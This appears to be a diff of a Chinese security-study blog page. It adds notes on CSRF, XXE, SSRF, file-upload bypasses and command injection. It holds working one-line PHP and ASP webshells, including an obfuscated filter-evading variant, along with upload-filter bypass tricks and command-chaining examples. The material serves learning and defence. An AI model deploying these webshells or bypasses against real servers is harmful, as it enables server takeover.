@@ -152,6 +152,300 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-安全进阶/其他常见web漏洞的原理与实践" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/05/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E5%85%B6%E4%BB%96%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/">其他常见web漏洞的原理与实践</a>
+    </h1>
+  
+
+        
+        <a href="/2021/05/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E5%85%B6%E4%BB%96%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/" class="archive-article-date">
+  	<time datetime="2021-05-18T11:17:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p><img src="https://i.loli.net/2021/05/18/fgMdmTUVkb3lv2Z.png" alt="image-20210518192126794"></p>
+<h3 id="CSRF–跨站请求伪造"><a href="#CSRF–跨站请求伪造" class="headerlink" title="CSRF–跨站请求伪造"></a>CSRF–跨站请求伪造</h3><p>XSS可以配合CSRF漏洞，完成进一步的攻击。</p>
+<p>XSS—利用xss获取其他用户的Cookie，然后使用对方的Cookie去访问网页，则此时该网页的登录用户则为对方的账号，修改密码，控制用户。为Cookie设置HTTPonly可以防止XSS注入获取用户的Cookie。</p>
+<p>XSS+CSRF—利用这两个漏洞修改对方的密码，然后进一步控制对方的用户—组合攻击的优点： 黑客无需向对方发送网址，只需要看到留言板（系统正常的功能），则恶意代码就会被触发（通过XSS漏洞而产生的，弥补了CSRF的缺点），然后利用CSRF伪造的脚本向网站发起请求，此时这个请求将会带上受害者本身的Cookie，不管XSS是否能获取到Cookie（Cookie是否设置了HTTPonly）此时的伪造脚本都会被执行。（利用CSRF弥补了XSS的缺点）</p>
+<p>CSRF—利用该漏洞，向对方发送恶意的链接，然后构造跨站请求伪造修改对方的密码，进一步控制对方用户—对方必须信任攻击者发送的网站，并且能够成功点击。</p>
+<p>防范：</p>
+<p>（1）referer：http请求包中存在该字段，表示的是从哪个网页访问到当前网页的。若referer的内容不是本网站，则推测可能遭遇了CSRF</p>
+<p>（2）二次校验：在关键的敏感网页加入验证码，需要输入正确的验证码才能进行操作。</p>
+<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>针对与XML文档中的外部实体实施的注入，全名为XML外部实体注入。</p>
+<p>XML：可扩展标记语言</p>
+<p>HTML：超文本标记语言</p>
+<p>XML中的标签是可扩展的，即可以自定义标签。</p>
+<p>在当前的DTD文档中声明实体：&lt;!ENTITY 实体名称 “Bill Gates”&gt;</p>
+<p>从外部的DTD文档声明实体：&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;—此时引用了外部的DTD文档，和文件包含有点类似。若此时外部DTD文档的值是用户可控的，则可能会产生XXE注入（XML外部实体注入）</p>
+<p>输出实体：&amp;实体名称;</p>
+<h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><p>伪造服务端发起请求</p>
+<p>1.探测内网IP、端口信息</p>
+<p>2.探测内网的Web应用程序、语言环境</p>
+<p>3.利用SSRF攻击Web应用</p>
+<p>4.file协议读取文件</p>
+<p>探测内网需要结合Gopher协议</p>
+<h3 id="HTTP拆分攻击-CRLF注入"><a href="#HTTP拆分攻击-CRLF注入" class="headerlink" title="HTTP拆分攻击/CRLF注入"></a>HTTP拆分攻击/CRLF注入</h3><p>针对HTTP头部进行的注入（条件：前端输入的或用户可控的内容被放在HTTP头部中）</p>
+<p>%0d%0a表示换行，则下一行的内容会被当做HTTP头部执行</p>
+<p>如果出现了%0d%0a%0d%0a两次换行的情况，则表示后面的内容为HTTP正文。因此可以构造XSS注入。</p>
+<h3 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h3><p>登录前后的会话ID不变</p>
+<h3 id="路径穿越漏洞"><a href="#路径穿越漏洞" class="headerlink" title="路径穿越漏洞"></a>路径穿越漏洞</h3><h3 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h3><h3 id="服务器远程部署漏洞"><a href="#服务器远程部署漏洞" class="headerlink" title="服务器远程部署漏洞"></a>服务器远程部署漏洞</h3><p>远程部署漏洞：利用web中间件的功能，将源代码上传到服务器。若源代码为一句话木马，则可以进一步获取web服务器权限。类似于文件上传。</p>
+<p>漏洞影响范围：有图形化界面，可以直接配置网站页面的中间件（主要的有WebLogic\Jboss\Tomcat）</p>
+<p>根据不同的中间件有不同的管理方式（Tomcat），管理端–已知用户名和密码。</p>
+<h3 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h3><p>网站渗透思路：信息收集（是否存在源码泄露）、上扫描器、看对应的中间件漏洞、组件漏洞、CMS漏洞（whatweb）、手工挖掘（SQL注入、文件上传、命令执行）。</p>
+<p>vim –.文件名.swp swo swn</p>
+<p>index.php意外关闭时会在同目录下生成.index.php.swp</p>
+<p>/.get/</p>
+<p>.svn/</p>
+<p>扫描目录，是否有敏感文件泄露—-御剑、kali中的dirb</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/05/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E5%85%B6%E4%BB%96%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-安全进阶/文件上传漏洞的原理与实践进阶" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/05/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/">文件上传漏洞的原理与实践进阶</a>
+    </h1>
+  
+
+        
+        <a href="/2021/05/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/" class="archive-article-date">
+  	<time datetime="2021-05-16T06:42:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="文件上传漏洞形成的原因"><a href="#文件上传漏洞形成的原因" class="headerlink" title="文件上传漏洞形成的原因"></a>文件上传漏洞形成的原因</h2><h3 id="文件上传功能"><a href="#文件上传功能" class="headerlink" title="文件上传功能"></a>文件上传功能</h3><p>文件上传功能是大部分WEB应用的必备功能，网站允许用户自行上传头像、一些社交类网站允许用户上传照片、一些服务类网站需要用户上传证明材料的电子档、电商类网站允许用户上传图片展示商品情况等。然而，看似不起眼的文件上传功能如果没有做好安全防护措施，就存在巨大的安全风险。</p>
+<h3 id="文件上传流程和上传攻击"><a href="#文件上传流程和上传攻击" class="headerlink" title="文件上传流程和上传攻击"></a>文件上传流程和上传攻击</h3><p>（1）如果WEB应用在<strong>文件上传过程中</strong>没有对文件的安全性进行有效的校验，攻击者可以通过<strong>上传WEBshell等恶意文件对服务器进行攻击，</strong>这种情况下认为系统存在文件上传漏洞。</p>
+<p>（2）一个文件上传的一般流程：</p>
+<p><img src="https://i.loli.net/2021/05/22/M3SaoXIwHTCckjr.png" alt="image-20210522102433375"></p>
+<h3 id="WebShell——网页木马文件"><a href="#WebShell——网页木马文件" class="headerlink" title="WebShell——网页木马文件"></a>WebShell——网页木马文件</h3><p>最常见利用文件上传漏洞的方法就是<strong>上传网站木马（webshell）文件</strong>，WEBSHELL又称网页木马文件，根据开发语言的不同又分为ASP木马、PHP木马、JSP木马等，该类木马利用了脚本语言中的系统命令执行、文件读写等函数的功能，一旦上传到服务器被脚本引擎解析，攻击者就可以实现对服务器的控制。</p>
+<table>
+<thead>
+<tr>
+<th align="center"></th>
+<th align="center">一句话木马(小马)</th>
+<th align="center">大马</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">功能</td>
+<td align="center">功能简单，需要配合客户端使用</td>
+<td align="center">功能完善，直接使用浏览器即可利用</td>
+</tr>
+<tr>
+<td align="center">大小</td>
+<td align="center">代码量通常在一行左右，不超过10行</td>
+<td align="center">代码量通常较大</td>
+</tr>
+<tr>
+<td align="center">隐蔽性</td>
+<td align="center">强，容易通过变形隐藏特征，绕过过滤</td>
+<td align="center">相对较弱，代码量大，容易被检测出来，通常需要通过加密等方式来隐藏特征。</td>
+</tr>
+</tbody></table>
+<h2 id="文件上传漏洞测试思路"><a href="#文件上传漏洞测试思路" class="headerlink" title="文件上传漏洞测试思路"></a>文件上传漏洞测试思路</h2><p>（1）由于上传WEBSHELL是对文件上传漏洞最有危害的利用方式，因此文件上传漏洞的测试的<strong>主要目标就是测试<br>能否通过文件上传功能上传webshell并成功执行。</strong></p>
+<p>（2）稍有经验的开发者都知道对文件上传功能进行一些限制，防止用户上传网页木马文件，但是如果开发者没有使用有效的限制手段，往往不能很好的阻止攻击者上传木马文件。<strong>判断应用对文件上传的限制手段并尝试进行绕过是文件上传漏洞测试的主要环节。</strong></p>
+<p><img src="https://i.loli.net/2021/05/22/r836OeuCaZIEHFp.png" alt="image-20210522104420690"></p>
+<h2 id="上传检测方式的类型与绕过方法"><a href="#上传检测方式的类型与绕过方法" class="headerlink" title="上传检测方式的类型与绕过方法"></a>上传检测方式的类型与绕过方法</h2><p>常见的限制手段和绕过限制手段进行上传攻击的方式：</p>
+<p><img src="https://i.loli.net/2021/05/22/QBy2KL7fVGq3cPz.png" alt="image-20210522104541799"></p>
+<h3 id="客户端检测"><a href="#客户端检测" class="headerlink" title="客户端检测"></a>客户端检测</h3><p>客户端检测最典型的方式就是JavaScript检测，由于JavaScript在客户端执行的特点，可以通过修改客户端代码或先上传符合要求的文件再在上传过程使用BURP等工具篡改文件等方式来绕过。</p>
+<h3 id="MIME类型检测"><a href="#MIME类型检测" class="headerlink" title="MIME类型检测"></a>MIME类型检测</h3><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是<strong>设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</strong>多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。标准的文件上传组件中会自动上传文件的MIME类型，但是由于MIME类型是从<strong>客户端</strong>传递的，修改也不影响文件正常运行，因此通过Burp Suite拦截和修改MIME类型可以轻易绕过此类检测。通常修改Content-Type的值，可将其改为合法的上传文件的类型，如：image/jpeg</p>
+<h3 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h3><p>针对文件头和文件内容检测通常有两种方式</p>
+<ul>
+<li>白名单的方式是检测上传的文件中是否有白名单类型文件的文件头等内容特征信息，满足要求方能上传。</li>
+<li>黑名单是检测一些WEBshell的特征，如果包含相关特征就不允许上传。</li>
+<li>针对白名单检测，可以在满足要求的文件后插入木马脚本语句来绕过。而黑名单则可以通过对关键函数的各类混淆变化来绕过。</li>
+</ul>
+<pre><code>黑名单绕过：
+变换过的PHP一句话木马：
+&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;; 
+ $a($_POST[&quot;cmd&quot;]);  ?&gt;
+变换过的ASP一句话木马：
+&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;
+//可编写过狗一句话绕过
+
+绕过文件头检测可以在文件头加上GIF89a，则会将文件当做gif文件、var_dump可打印所有的对象，可以查看对象内部的数据结构，用于判断一个变量的类型与长度，并输出变量的数值、system可执行系统命令。</code></pre>
+<p><img src="https://i.loli.net/2021/05/22/gnBwzecurOIDp74.png" alt="image-20210522231814753"></p>
+<h3 id="图片木马的制作方法"><a href="#图片木马的制作方法" class="headerlink" title="图片木马的制作方法"></a>图片木马的制作方法</h3><p>（1）图片马的利用场景</p>
+<ul>
+<li>当攻击者手上获取到一个网站存在上传点，但是上传做了限制，不能进一步利用。但却发现该站存在本地文件包含漏洞。攻击可以通过构造图片马进行上传，再结合本地文件包含漏洞执行图片马中的木马，从而可以导致攻击者获取到webshell。</li>
+<li>还有一种情况是用来绕过内容检测，针对文件头和文件内容的检测有白名单和黑名单两种方式。因此，攻击者可以通过在图片中插入恶意代码，或者插入关键函数被混淆过的恶意代码来构造图片马进行内容检测的绕过。</li>
+</ul>
+<p>（2）文件检测技术</p>
+<ul>
+<li><p>getimagesize() 函数：用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条<br>E_WARNING 级的错误信息。要绕过该函数必须要做到不影响原本的图片，如下所示：</p>
+<p>GIF89a(…some binary data…)&lt;?php phpinfo(); ?&gt;(… skipping the rest of binary data …)</p>
+</li>
+<li><p>文件加载检测：一般是调用的 API 或函数去进行文件加载测试 ，常见的是图像渲染测试。</p>
+</li>
+</ul>
+<p>（3）edjpgcom可在JPG文件中插入注释, 而不会损坏原来的文件（即插入内容后图片仍可浏览）。因此，上述的两种文件检测技术都可以使用edjpgcom工具来绕过检测。</p>
+<p><img src="https://i.loli.net/2021/05/22/w98LUSKOPG6siju.png" alt="image-20210522111804219"></p>
+<p><img src="https://i.loli.net/2021/05/22/FwU2o96DaBe8uYE.png" alt="image-20210522111953025"></p>
+<h3 id="扩展名过滤"><a href="#扩展名过滤" class="headerlink" title="扩展名过滤"></a>扩展名过滤</h3><p>（1）正常情况下如果用户上传的网页木马文件不是以响应的脚本文件扩展名上传的，则无法正常运行，达不到控制网站服务器的目的。然而，如果对文件扩展名检测的实现方式不当的话仍然存在风险。</p>
+<p>（2）文件扩展名检测通常分为黑名单检测和白名单检测两种，黑名单指事先设定好不允许上传的文件扩展名（通常是各类脚本的扩展名），如果上传文件的扩展名与黑名单匹配则不允许上传，白名单则是事先设定好允许上传的文件扩展名（根据业务需求，通常传是图片等），只有上传文件的扩展名与白名单匹配才允许上传。</p>
+<p><img src="https://i.loli.net/2021/05/22/E7LlMHjxOsmF96I.png" alt="image-20210522112733607"></p>
+<p>注：白名单绕过方式通常对黑名单过滤也有效</p>
+<h3 id="黑名单检测绕过"><a href="#黑名单检测绕过" class="headerlink" title="黑名单检测绕过"></a>黑名单检测绕过</h3><p>（1）不常见的扩展名：程序员在设置黑名单时通常会添加一些常见的脚本文件扩展，但是对于一些不常见的扩展名则有可能被忽略，这些扩展名可以正常被解析达到与木马相同的效果。例如：PHP3、PHP4、PHP5、PH、CER、CDX、ASA等。</p>
+<p>（2）扩展名大小写绕过：如果程序员在编写黑名单的时候没有考虑到扩展名的大小写问题，则可以通过扩展名的大小写来绕过黑名单检测机制。常见案例：PHP、PhP、pHp……</p>
+<p>（3）特殊字符结尾：在windows环境下，文件扩展名如果以小数点或空格结尾，在保存时系统会自动去除这些符号，因此可以通过在上传的文件扩展名后加入小数点或空格来绕过黑名单限制。</p>
+<p>（4）ASHX是一种特殊的脚本文件，这类文件不能直接执行，但是可以利用它生成其他的木马文件，如果程序员在设置黑名单时忘记添加此类脚本后缀名，也可以通过上传ASHX文件间接的实现上传webshell的效果。</p>
+<h3 id="截断绕过"><a href="#截断绕过" class="headerlink" title="截断绕过"></a>截断绕过</h3><h4 id="0x00截断："><a href="#0x00截断：" class="headerlink" title="0x00截断："></a>0x00截断：</h4><p>在许多语言的函数中，比如在C、PHP等语言的常用字符串处理函数中，0x00被认为是终止符。攻击者通常会利用该字符构造特殊的后缀名或目录来绕过白名单的限制。比如应用原本只允许JPG上传，攻击者修改POST包，构造文件名为xx.php[/0].JPG，[/0]为16进制的0x00字符，.JPG绕过了应用的上传文件类型判断；但是对于服务端来说，由于有0x00字符，认为中止了，最终会认为读取的是xx.php文件。</p>
+<p>1、若文件名可控制，可以尝试构造类似于1.asp\x00.JPG的方式来进行绕过白名单检测机制；<br>2、若文件路径可控制，可以尝试构造文件路径为1.asp\x00，文件名为符合白名单的扩展名的方式来进行绕过白名<br>单检测机制；<br>3、若PHP版本php版本小于5.3.4且php的magic_quotes_gpc为OFF状态时，可用%00来代替\x00实现文件上传的绕过。</p>
+<p>字符串出现\0，则表示该字符串已经结束。例如：1.php\0.jpg</p>
+<pre><code>array[6]=[&quot;1&quot;,2,3,4,5,6,\0]</code></pre>
+<p>具体操作：文件名为1.php.jpg，用burpsuite抓包，先修改文件名为1.php .jpg，再利用hex选项，将添加的空格十六进制20改为00即可。</p>
+<h4 id="冒号截断"><a href="#冒号截断" class="headerlink" title="冒号截断"></a>冒号截断</h4><p>冒号（“:”）是一个在系统中不能作为文件名的符号，在文件保存时会自动截断冒号后面的内容，但是某些文件保存函数中没有对其处理，可以尝试构造类似于1.php:1.jpg的文件绕过白名单检测。</p>
+<h3 id="利用文件解析漏洞绕过"><a href="#利用文件解析漏洞绕过" class="headerlink" title="利用文件解析漏洞绕过"></a>利用文件解析漏洞绕过</h3><p>（1）对于IIS6.0而言，若文件目录名以.ASP或.ASA等脚本文件扩展名形式结尾，则该文件目录下的所有文件都会被当做ASP文件解析，因此如果上传功能允许用户自定义上传的文件路径，则可以通过将文件路径设置为以.ASP结尾的形式进行攻击，此时即使上传的网页木马文件符合扩展名白名单仍会被作为脚本解析。例如将文件路径设置为/1.asp/，文件名为1.jpg，此时访问/1.asp/1.jpg，1.jpg会被当做ASP文件解析。</p>
+<p>（2）在IIS6.0的环境下，分号以后的内容在解析过程中会被忽略，因此如果上传类似于1.php;1.jpg形式的网页木马文件，会被当做php文件解析。</p>
+<p>（3）apache在解析文件时如果遇到无法识别的扩展名，将会从后向前解析，直到碰到认识的扩展名为止，如果扩展名白名单中包含Apache无法解析的扩展名（以.7z为例），则可以构造类似于：1.php.7z这样的文件名进行上传，由于7z文件Apache无法解析，Apache最终会将该文件作为PHP脚本解析。</p>
+<p>（4）在IIS 7.0/IIS 7.5/Nginx &lt;=0.8.37的环境下，在一个文件路径(/xx.jpg)后面加上/xx.php会将 /xx.jpg/xx.php 解析为 php 文件。</p>
+<h3 id="特殊的上传绕过方式"><a href="#特殊的上传绕过方式" class="headerlink" title="特殊的上传绕过方式"></a>特殊的上传绕过方式</h3><p>（1）.htaccess叫分布式配置文件，它提供了针对目录改变配置的方法——在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录；</p>
+<p>（2）.htaccess文件可以实现很多特殊功能，其中一个功能可以修改扩展名的解析方式，如：在.htaccess文件中添加以下内容，可以将.jpg文件解析为PHP 。添加内容：SetHandler application/x-httpd-php .jpg；</p>
+<p>（3）在这种情况下我们只需要上传一个文件，扩展名为.jpg的webshell文件以及上述.htaccess文件，即可通过webshell控制服务器；</p>
+<h3 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h3><p>（1）双文件上传是一种特殊的攻击方式，该类型的攻击主要是利用程序员在编写白名单检测机制时没有考虑到一次性上传多个文件的情况下，检测机制的不完整性来进行上传攻击。</p>
+<p>（2）通常可以通过修改html页面的方式来实现一次上传多个文件，其中第一个文件为正常的文件，第二个文件为webshell文件，服务端在校验了第一个文件通过后，检测机制对第二个文件失效，使得webshell文件上传成功。</p>
+<p>（3）修改前端代码，复制上传文件的输入框，修改name字段的值并粘贴，新构建一个上传点。</p>
+<p><img src="https://i.loli.net/2021/05/22/74wq9WDdVR8JviB.png" alt="image-20210522122705186"></p>
+<h2 id="文件上传漏洞的防范"><a href="#文件上传漏洞的防范" class="headerlink" title="文件上传漏洞的防范"></a>文件上传漏洞的防范</h2><p>（1）对上传的文件的扩展名和文件报头信息在服务端与白名单对比，不符合白名单的不予保存。</p>
+<p>（2）上传过程不应传递目录或文件路径，使用预先设置路径列表中的匹配索引值，严禁泄露文件绝对路径。</p>
+<p>（3）对文件进行重命名，使用随机性好的文件目录和文件名进行保存。</p>
+<p>（4）上传文件的临时目录和保存目录不允许执行权限。</p>
+<p>（4）有条件时可将内容保存在服务器或者数据库中。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>（1）客户端校验：先正常传，然后抓包改包</p>
+<p>（2）MIME类型校验：传木马，然后改Content-Type</p>
+<p>（3）文件内容检测</p>
+<ul>
+<li>白名单文件类型检测：只允许某些类型的文件上传。检测你的文件内容必须是一个图片。绕过方式：构造一个图片木马。</li>
+<li>黑名单文件类型检测：不允许某些类型的文件上传。通过关键函数检测文件内容不能为木马。绕过方式：构造过狗一句话。</li>
+</ul>
+<p>文件内容：文件头部、文件正文、文件尾部</p>
+<p>（4）扩展名检测：</p>
+<ul>
+<li>黑名单扩展名检测：检测文件后缀不能为.php（不允许的后缀名称）。绕过方式：不常见的扩展名（.htaccess/ASHX/PHAr/php3/php4/php5/php7）、大小写绕过、特殊字符结尾（”.”、” “）。</li>
+<li>白名单扩展名检测：检测文件后缀只能为.jpg（允许的后缀名）。绕过方式：阶段绕过（00截断，冒号截断）、解析漏洞（针对与中间件存在的漏洞：IIS6.0解析漏洞–1.如果文件夹为.ASP命名，则底下的所有内容都会被当做ASP的脚本解析。2.分号在解析过程中会被忽略，则可以使用xx.php;xx.jpg进行绕过。此时xx.php;xx.jpg文件会被当做PHP脚本解析）</li>
+</ul>
+<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>一句话木马：</p>
+<pre><code>&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;
+cmd=var_dump(scandir(&#39;../&#39;));    查看上一级目录文件</code></pre>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/05/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-安全进阶/命令执行原理与实践" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -172,39 +466,68 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>RCE：</p>
+        <h2 id="命令执行漏洞原理与利用"><a href="#命令执行漏洞原理与利用" class="headerlink" title="命令执行漏洞原理与利用"></a>命令执行漏洞原理与利用</h2><h3 id="命令执行漏洞概念"><a href="#命令执行漏洞概念" class="headerlink" title="命令执行漏洞概念"></a>命令执行漏洞概念</h3><p>（1）远程命令执行漏洞(RCE)是指可以在仅有远程访问权限的情况下执行系统命令的漏洞，是安全漏洞中危害最大的一类。<br>（2）在WEB应用中，远程命令执行漏洞通常分为<strong>命令注入</strong>和<strong>代码注入</strong>两类：</p>
 <ul>
-<li>remote command execution 远程命令执行，例如ipconfig–显示IP信息</li>
-<li>remote code execution 远程代码执行，例如echo 1–1</li>
+<li>命令注入：可通过HTTP请求直接让服务端执行系统命令的漏洞，通常是由于系统命令执行函数引用了用户可控变量且未进行有效过滤引起的。</li>
+<li>代码注入：可通过HTTP请求让服务端执行服务端WEB代码的漏洞，通过服务端WEB代码也可以实现服务端系统命令执行，此类漏洞通常是由于代码执行函数引用了用户可控变量且未进行有效过滤引起的。常用的一句话木马就是一个人为生成的代码注入漏洞。</li>
 </ul>
-<p>注：文件上传也是RCE漏洞</p>
-<p>PHP中能够执行系统命令的函数：exec、system、passthru、shell_exec、popen</p>
-<pre><code>ping 127.0.0.1 | whoami        //只会执行管道符后面的命令
+<p>（3）此外，其他一些安全漏洞在利用过程中也可能导致导致远程命令执行，如文件包含漏洞、反序列化漏洞等。</p>
+<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>（1）有的时候，开发web应用需要调用到一些能够执行系统命令的函数，如PHP中的system、exec、shell_exec、数据库的自定义函数UDF等，当用户能够控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令注入攻击。</p>
+<pre><code>//PHP系统命令执行函数：
+exec()、 system()、passthru()、shell_exec()、popen
+//JSP执行系统命令：
+Runtime run = Runtime.getRuntime();
+run.exec(&quot;ipconfig&quot;);
+//ASP执行系统命令：
+&lt;%Response.write 
+CreateObject(&quot;wscript.shell&quot;).exec(&quot;cmd.exe /c 
+ipconfig&quot;).StdOut.ReadAll%&gt;</code></pre>
+<p>（2）以DVWA为例</p>
+<p><img src="https://i.loli.net/2021/05/18/t4fHy5RmJZI9xKF.png" alt="image-20210518183136399"></p>
+<pre><code class="php">&lt;?php
 
-ping 127.0.0.1 || whoami       //执行两个命令
+if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;
+    // Get input
+    $target = $_REQUEST[ &#39;ip&#39; ];
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;
+        // Windows
+        $cmd = shell_exec( &#39;ping  &#39; . $target );
+    &#125;
+    else &#123;
+        // *nix
+        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );
+    &#125;
+
+    // Feedback for the end user
+    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;
+&#125;
+?&gt;</code></pre>
+<h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>（1）在之前的学习中，我们知道文件包含漏洞是可以造成php代码执行的。但是在如PHP等语言中，能够执行php代码的方法远不止文件包含这一种，比如危险的函数eval()。</p>
+<p>（2）代码注入的情况非常灵活，但究其原因仍离不开两个关键条件：第一是用用户能够控制函数的输入；第二是存在可以执行代码的危险函数。</p>
+<p>（3）常见的代码执行函数：</p>
+<pre><code>assert()
+eval()
+preg_repace()
+create_function()
+array_map()
+call_user_func()
+call_user_func_array()</code></pre>
+<h3 id="命令注入漏洞的测试与利用"><a href="#命令注入漏洞的测试与利用" class="headerlink" title="命令注入漏洞的测试与利用"></a>命令注入漏洞的测试与利用</h3><p>除了dir命令，我们还可以测试其他的命令，如ping，whoami，ipconfig，ifconfig，net user等，通过&amp;&amp;或者||符号进行拼接。</p>
+<pre><code>ping 127.0.0.1 | whoami        //只会执行管道符后面的命令
+ping 127.0.0.1 || whoami       //若第一个命令执行成功则不执行第二个命令
+
 ping 127.0.0.1 &amp; whoami        //执行两个命令
 ping 127.0.0.1 &amp;&amp; whoami       //执行两个命令</code></pre>
-<p>一句话木马工作流程：</p>
-<ul>
-<li>利用eval等危险函数引发远程代码执行，执行任意的PHP代码。</li>
-<li>利用PHP代码中的shell_exec、system等危险函数触发远程命令执行，查看电脑上的所有文件，并且可以执行系统命令，拿到了系统的权限</li>
-</ul>
-<pre><code>菜刀工具一般只能用POST方式传参。
-万能写法：
-&lt;?php
-    @eval($_REQUEST[&#39;cmd&#39;]);   //request可以接受get、post、cookie传的参数
-?&gt;</code></pre>
-<p>常见代码执行函数：</p>
-<p>assert()  断言。将字符串当作代码执行一次进行判断，判断是否为True。</p>
-<pre><code>&lt;?php
